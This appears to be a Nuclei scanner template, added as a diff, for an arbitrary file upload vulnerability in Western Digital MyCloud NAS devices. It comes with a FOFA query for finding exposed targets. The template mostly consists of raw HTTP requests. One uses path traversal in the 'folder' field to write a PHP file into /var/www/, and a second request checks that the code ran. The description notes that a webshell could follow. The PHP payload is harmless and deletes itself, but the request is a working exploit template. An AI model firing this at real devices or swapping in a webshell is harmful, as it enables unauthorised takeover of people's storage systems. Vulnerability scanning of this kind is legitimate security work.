@@ -1,0 +1,50 @@
+id: westcn-nas-upload-file-upload
+
+info:
+  name: "Western-Digital-MyCloud NAS addons 任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
+      Western Digital MyCloud NAS 是支持网络访问和多设备备份功能的存储设备。其 addons/upload.php 接口未正确验证文件上传请求，导致攻击者可构造恶意请求上传任意文件。成功利用可实现服务器端代码执行，通过写入Webshell建立持久化控制通道，最终导致目标系统完全失陷。
+  tags: Western-Digital-MyCloud
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /web/addons/upload.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="folder"
+
+    /../../../../../../../../var/www/
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="name"
+
+    1
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="index"
+
+    2.php
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary--
+- raw:
+  - |
+    GET /1-2.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
